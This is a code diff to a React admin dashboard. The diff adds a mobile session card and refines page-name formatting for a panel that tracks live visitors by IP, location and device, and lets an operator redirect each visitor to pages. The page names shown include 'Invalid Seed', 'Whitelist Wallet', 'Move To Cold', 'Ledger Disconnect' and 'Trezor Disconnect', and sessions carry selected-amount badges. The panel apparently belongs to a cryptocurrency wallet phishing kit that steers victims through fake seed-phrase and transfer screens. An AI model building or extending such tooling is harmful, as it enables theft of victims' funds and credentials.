@@ -53,6 +53,139 @@ const getEmojiForSession = (sessionId) => {
   return ANIMAL_EMOJIS[num % ANIMAL_EMOJIS.length];
 };
 
+const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isNew }) => {
+  const [selectedPage, setSelectedPage] = useState(session.currentPage || 'loading.html');
+  const browser = DeviceDetectorUtil.detectBrowser(session.userAgent);
+  const os = DeviceDetectorUtil.detectOS(session.userAgent);
+
+  const formatPageName = (page) => {
+    if (!page) return '';
+    
+    // Remove any path components and get just the filename
+    const filename = page.split('/').pop();
+    
+    // Remove .html and handle both hyphen and normal case
+    return filename
+      .replace('.html', '')
+      .replace(/([A-Z])/g, ' $1') // Add space before capital letters
+      .split(/[-\s]/) // Split by hyphens or spaces
+      .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
+      .join(' ')
+      .trim();
+  };
+
+  const actionIconStyle = "w-4 h-4";
+  const actionButtonStyle = `
+    p-2 rounded-lg transition-colors duration-200
+    backdrop-blur-sm active:scale-95
+  `;
+
+  return (
+    <div className={`
+      relative p-4 mb-3
+      bg-[#1A1A1A] rounded-lg border border-white/10
+      ${isNew ? 'animate-highlight' : ''}
+    `}>
+      {/* Badge for review status */}
+      {(session.reviewCompleted || session.selectedAmount) && (
+        <div className="absolute -top-2 right-4 flex items-center space-x-2">
+          {session.reviewCompleted && (
+            <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
+                          bg-gradient-to-r from-green-500/5 to-green-500/10
+                          ring-1 ring-green-500/20 text-green-400">
+              Reviewed
+            </div>
+          )}
+          {session.selectedAmount && (
+            <div className="inline-flex items-center px-1.5 py-[1px] rounded-full text-[10px] font-medium
+                          bg-gradient-to-r from-blue-500/5 to-blue-500/10
+                          ring-1 ring-blue-500/20 text-blue-400">
+              {session.selectedAmount}
+            </div>
+          )}
+        </div>
+      )}
+
+      {/* Header Row */}
+      <div className="flex items-center justify-between mb-3">
+        <div className="flex items-center space-x-2">
+          {settings.showEmojis ? (
+            <span className="text-lg">{getEmojiForSession(session.id)}</span>
+          ) : (
+            <Monitor className="w-4 h-4 text-white/40" />
+          )}
+          <span className="text-sm font-medium text-white/80">{session.id}</span>
+        </div>
+        <StatusBadge 
+          status={session.loading ? 'loading' : (session.connected ? 'connected' : 'inactive')} 
+        />
+      </div>
+
+      {/* Info Rows */}
+      <div className="space-y-2 mb-3">
+        <div className="flex items-center justify-between">
+          <div className="flex items-center space-x-2">
+            <MapPin className="w-4 h-4 text-white/40" />
+            <span className="text-sm text-white/60">
+              {session.ip} • {session.city}, {session.country}
+            </span>
+          </div>
+        </div>
+
+        <div className="flex items-center justify-between">
+          <div className="flex items-center space-x-2">
+            <span className="text-sm text-white/60">
+              {os} • {browser}
+            </span>
+          </div>
+          <HeartbeatIndicator lastHeartbeat={session.lastHeartbeat} />
+        </div>
+
+        <div className="bg-white/5 px-2 py-1 rounded-md inline-block">
+          <span className="text-sm text-white/80">
+            {formatPageName(session.currentPage)}
+          </span>
+        </div>
+      </div>
+
+      {/* Actions Row */}
+      <div className="flex items-center justify-between mt-4">
+        <CategorizedPageSelect
+          selectedPage={selectedPage}
+          onPageChange={setSelectedPage}
+          isHovered={false}
+        />
+        
+        <div className="flex items-center space-x-2">
+          <button
+            onClick={() => onRedirect(session.id, selectedPage)}
+            className={`${actionButtonStyle} bg-blue-500/20 text-blue-400`}
+            title="Redirect User"
+          >
+            <ExternalLink className={actionIconStyle} />
+          </button>
+
+          <button
+            onClick={() => onRemove(session.id)}
+            className={`${actionButtonStyle} bg-orange-500/20 text-orange-400`}
+            title="Remove Session"
+          >
+            <Trash2 className={actionIconStyle} />
+          </button>
+
+          <button
+            onClick={() => onBan(session.ip)}
+            className={`${actionButtonStyle} bg-red-500/20 text-red-400`}
+            title="Ban IP"
+          >
+            <Ban className={actionIconStyle} />
+          </button>
+        </div>
+      </div>
+    </div>
+  );
+};
+
 const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered }) => {
   const pageCategories = {
     Introduction: [
@@ -189,28 +322,45 @@ const StatusBadge = ({ status }) => {
 
 const SessionHeaderRow = () => {
   return (
-    <div className="relative px-6 py-3 bg-[#1A1A1A]">
+    <div className="relative px-6 py-4">
+      <div className="absolute inset-0 bg-white/[0.01] backdrop-blur-sm" />
+      <div className="absolute inset-0 bg-gradient-to-r from-blue-500/5 to-transparent opacity-0" />
+      <div className="absolute inset-0 bg-gradient-to-b from-white/[0.02] to-transparent opacity-0" />
+      
       <div className="relative flex items-center justify-between">
-        <div className="w-1/4 text-xs font-medium text-white/60 uppercase tracking-wider">
-          Session Info
+        <div className="flex flex-col w-1/4">
+          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
+            Session Info
+          </div>
         </div>
-        <div className="w-1/6 text-xs font-medium text-white/60 uppercase tracking-wider pl-2">
-          Device
+        <div className="w-1/6">
+          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
+            Device
+          </div>
         </div>
-        <div className="w-1/6 text-xs font-medium text-white/60 uppercase tracking-wider pl-1">
-          Location
+        <div className="w-1/6">
+          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
+            Location
+          </div>
         </div>
-        <div className="w-1/6 text-xs font-medium text-white/60 uppercase tracking-wider">
-          Current Page
+        <div className="w-1/6">
+          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
+            Current Page
+          </div>
         </div>
-        <div className="w-1/6 text-xs font-medium text-white/60 uppercase tracking-wider pl-1">
-          Last Active
+        <div className="w-1/6">
+          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
+            Last Active
+          </div>
         </div>
-        <div className="w-1/6 text-xs font-medium text-white/60 uppercase tracking-wider pl-2">
-          Status
+        <div className="w-1/6">
+          <div className="text-xs font-medium text-white/60 uppercase tracking-wider">
+            Status
+          </div>
         </div>
-        {/* Space for actions */}
-        <div className="w-24" />
+        <div className="w-1/6">
+          {/* Space for actions */}
+        </div>
       </div>
     </div>
   );
@@ -225,9 +375,31 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
   const os = DeviceDetectorUtil.detectOS(session.userAgent);
 
   const formatPageName = (page) => {
-    return page.replace('.html', '').split('-').map(
-      word => word.charAt(0).toUpperCase() + word.slice(1)
-    ).join(' ');
+    if (!page) return '';
+    
+    // First remove any path and get just the filename
+    const filename = page.split('/').pop();
+    
+    // Special case handling for known pages
+    const knownPages = {
+      'whitelistwallet': 'Whitelist Wallet',
+      'estimatedbalance': 'Estimated Balance',
+      'pendingreview': 'Pending Review',
+      'whitelistsuccessful': 'Whitelist Successful',
+      'disconnectwallet': 'Disconnect Wallet',
+      'unlinkwallet': 'Unlink Wallet',
+      'movetocold': 'Move To Cold',
+      'invalidseed': 'Invalid Seed',
+      'ledgerdisconnect': 'Ledger Disconnect',
+      'trezordisconnect': 'Trezor Disconnect',
+      'loading': 'Loading',
+      'review': 'Review'
+    };
+  
+    // Remove .html and convert to lowercase for matching
+    const baseName = filename.replace('.html', '').toLowerCase();
+    
+    return knownPages[baseName] || baseName;
   };
 
   return (
@@ -376,7 +548,8 @@ const SessionRow = ({ session, onRedirect, onBan, onRemove, isNew }) => {
 };
 
 const SessionList = () => {
-  const { sessions, banIP, redirectUser, removeSession } = useAdminSocket();
+  // Add settings to the destructured values from useAdminSocket
+  const { sessions, banIP, redirectUser, removeSession, settings } = useAdminSocket();
   const [isHovered, setIsHovered] = useState(false);
   const [newSessions, setNewSessions] = useState(new Set());
   const [heartbeatTick, setHeartbeatTick] = useState(0);
@@ -441,6 +614,7 @@ const SessionList = () => {
             </div>
           </div>
 
+          {/* Desktop View */}
           <div className="hidden lg:block">
             <SessionHeaderRow />
             <div className="divide-y divide-white/[0.06]">
@@ -454,13 +628,29 @@ const SessionList = () => {
                   isNew={newSessions.has(session.id)}
                 />
               ))}
-              {sessions.length === 0 && (
-                <div className="px-6 py-8 text-center">
-                  <p className="text-white/60">No active sessions</p>
-                </div>
-              )}
             </div>
           </div>
+
+          <div className="block lg:hidden p-4">
+        {sessions.map((session) => (
+          <MobileSessionCard
+            key={session.id}
+            session={session}
+            settings={settings}  // Now settings is defined and can be passed
+            onRedirect={redirectUser}
+            onBan={handleBanIP}
+            onRemove={handleRemoveSession}
+            isNew={newSessions.has(session.id)}
+          />
+        ))}
+      </div>
+
+          {/* Empty State */}
+          {sessions.length === 0 && (
+            <div className="px-6 py-8 text-center">
+              <p className="text-white/60">No active sessions</p>
+            </div>
+          )}
         </div>
       </div>
     </div>
